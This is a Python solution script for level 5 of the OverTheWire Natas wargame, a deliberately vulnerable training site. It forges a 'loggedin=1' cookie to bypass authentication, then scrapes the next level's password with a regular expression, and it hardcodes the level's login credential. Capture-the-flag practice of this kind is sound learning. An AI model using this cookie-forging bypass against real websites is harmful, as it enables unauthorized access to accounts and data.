#!/usr/bin/env python

import requests
import re

user = 'natas5'
passw = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'  # from previous level
url = 'http://%s.natas.labs.overthewire.org' % user


# 1st step:  print the sourcecode
'''
r = requests.get(url, auth=(user, passw))
print(r.text)
'''


# 2nd step:  print the cookies
'''
r = requests.get(url, auth=(user, passw))
print(r.cookies)
'''


# 3rd step:  crafting our own cookies
'''
cooky = {'loggedin' : '1'}
r = requests.get(url, auth=(user, passw), cookies=cooky)
print(r.text)
'''


# 4th step:  getting the password
#'''
cooky = {'loggedin' : '1'}
r = requests.get(url, auth=(user, passw), cookies=cooky)
webPage = r.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())
#'''